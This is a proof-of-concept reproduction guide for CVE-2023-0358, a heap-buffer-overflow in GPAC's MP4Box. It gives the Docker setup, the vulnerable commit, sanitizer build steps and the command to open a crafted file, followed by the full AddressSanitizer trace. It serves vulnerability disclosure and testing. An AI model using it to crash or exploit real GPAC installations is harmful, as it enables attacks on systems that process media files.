### CVE-2023-0358

### PoC Links
[Huntr.dev](https://huntr.dev/bounties/93e128ed-253f-4c42-81ff-fbac7fd8f355/)

### Docker Container Run Command
```shell
docker build -t cve-2023-0358-poc .
docker run -itd --name CVE-2023-0358-POC cve-2023-0358-poc
docker exec -it CVE-2023-0358-POC /bin/bash
```

### PoC Reproduce Command
```shell
# Preparing the initial environment
apt-get update -y
apt-get install git -y

# Configure local SSH for Github and clone the repository. (ssh-keygen)
cd /poc
git clone git@github.com:gpac/gpac.git

# Rollback to the vulnerable version.
cd gpac/
git reset --hard 7e2cb01002056bde1b66062f83010f0d30a79bdb

# Install the compilation and installation dependencies.
apt install gcc make zlib1g-dev pkg-config clang libtool-bin build-essential llvm-dev libunwind-dev -y

# Configure, compile, and install.
./configure --enable-sanitizer --enable-debugmake
make
make install

# Open the poc file.
MP4Box -hint /poc/POC
```

### Description
Observed that:
```shell
=================================================================
==10383==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xffffa4d01d11 at pc 0xffffac1f9038 bp 0xfffff48499c0 sp 0xfffff48499d0
READ of size 1 at 0xffffa4d01d11 thread T0
#0 0xffffac1f9034 in gf_m2ts_process_tdt_tot (/usr/local/lib/libgpac.so.12+0x2169034)
#1 0xffffac1fae78 in gf_m2ts_section_complete (/usr/local/lib/libgpac.so.12+0x216ae78)
#2 0xffffac1fc760 in gf_m2ts_gather_section (/usr/local/lib/libgpac.so.12+0x216c760)
#3 0xffffac2012b4 in gf_m2ts_process_packet (/usr/local/lib/libgpac.so.12+0x21712b4)
#4 0xffffac203668 in gf_m2ts_process_data (/usr/local/lib/libgpac.so.12+0x2173668)
#5 0xffffac20c684 in gf_m2ts_probe_buffer (/usr/local/lib/libgpac.so.12+0x217c684)
#6 0xffffac806d20 in m2tsdmx_probe_data (/usr/local/lib/libgpac.so.12+0x2776d20)
#7 0xffffac70592c in gf_filter_pid_raw_new (/usr/local/lib/libgpac.so.12+0x267592c)
#8 0xffffac87d1a4 in filein_process (/usr/local/lib/libgpac.so.12+0x27ed1a4)
#9 0xffffac70c08c in gf_filter_process_task (/usr/local/lib/libgpac.so.12+0x267c08c)
#10 0xffffac6d52b4 in gf_fs_thread_proc (/usr/local/lib/libgpac.so.12+0x26452b4)
#11 0xffffac6df98c in gf_fs_run (/usr/local/lib/libgpac.so.12+0x264f98c)
#12 0xffffac1f0054 in gf_media_import (/usr/local/lib/libgpac.so.12+0x2160054)
#13 0xaaaabdab4774 in convert_file_info /poc/gpac/applications/mp4box/fileimport.c:130
#14 0xaaaabda83fb8 in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6302
#15 0xffffa98773f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#16 0xffffa98774c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#17 0xaaaabda5f4ec in _start (/usr/local/bin/MP4Box+0xa64ec)

0xffffa4d01d11 is located 0 bytes to the right of 1-byte region [0xffffa4d01d10,0xffffa4d01d11)
allocated by thread T0 here:
#0 0xffffaf1ba2f4 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145
#1 0xffffac1fac28 in gf_m2ts_section_complete (/usr/local/lib/libgpac.so.12+0x216ac28)
#2 0xffffac1fc760 in gf_m2ts_gather_section (/usr/local/lib/libgpac.so.12+0x216c760)
#3 0xffffac2012b4 in gf_m2ts_process_packet (/usr/local/lib/libgpac.so.12+0x21712b4)
#4 0xffffac203668 in gf_m2ts_process_data (/usr/local/lib/libgpac.so.12+0x2173668)
#5 0xffffac20c684 in gf_m2ts_probe_buffer (/usr/local/lib/libgpac.so.12+0x217c684)
#6 0xffffac806d20 in m2tsdmx_probe_data (/usr/local/lib/libgpac.so.12+0x2776d20)
#7 0xffffac70592c in gf_filter_pid_raw_new (/usr/local/lib/libgpac.so.12+0x267592c)
#8 0xffffac87d1a4 in filein_process (/usr/local/lib/libgpac.so.12+0x27ed1a4)
#9 0xffffac70c08c in gf_filter_process_task (/usr/local/lib/libgpac.so.12+0x267c08c)
#10 0xffffac6d52b4 in gf_fs_thread_proc (/usr/local/lib/libgpac.so.12+0x26452b4)
#11 0xffffac6df98c in gf_fs_run (/usr/local/lib/libgpac.so.12+0x264f98c)
#12 0xffffac1f0054 in gf_media_import (/usr/local/lib/libgpac.so.12+0x2160054)
#13 0xaaaabdab4774 in convert_file_info /poc/gpac/applications/mp4box/fileimport.c:130
#14 0xaaaabda83fb8 in mp4box_main /poc/gpac/applications/mp4box/mp4box.c:6302
#15 0xffffa98773f8  (/lib/aarch64-linux-gnu/libc.so.6+0x273f8)
#16 0xffffa98774c8 in __libc_start_main (/lib/aarch64-linux-gnu/libc.so.6+0x274c8)
#17 0xaaaabda5f4ec in _start (/usr/local/bin/MP4Box+0xa64ec)

SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/local/lib/libgpac.so.12+0x2169034) in gf_m2ts_process_tdt_tot
Shadow bytes around the buggy address:
0x200ff49a0350: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff49a0360: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff49a0370: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff49a0380: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff49a0390: fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 fa
=>0x200ff49a03a0: fa fa[01]fa fa fa 00 00 fa fa 00 00 fa fa 03 fa
0x200ff49a03b0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 00 00
0x200ff49a03c0: fa fa 00 00 fa fa fd fa fa fa 00 00 fa fa 00 00
0x200ff49a03d0: fa fa 00 00 fa fa 00 00 fa fa 00 00 fa fa 06 fa
0x200ff49a03e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
0x200ff49a03f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable:           00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone:       fa
Freed heap region:       fd
Stack left redzone:      f1
Stack mid redzone:       f2
Stack right redzone:     f3
Stack after return:      f5
Stack use after scope:   f8
Global redzone:          f9
Global init order:       f6
Poisoned by user:        f7
Container overflow:      fc
Array cookie:            ac
Intra object redzone:    bb
ASan internal:           fe
Left alloca redzone:     ca
Right alloca redzone:    cb
Shadow gap:              cc
==10383==ABORTING
```



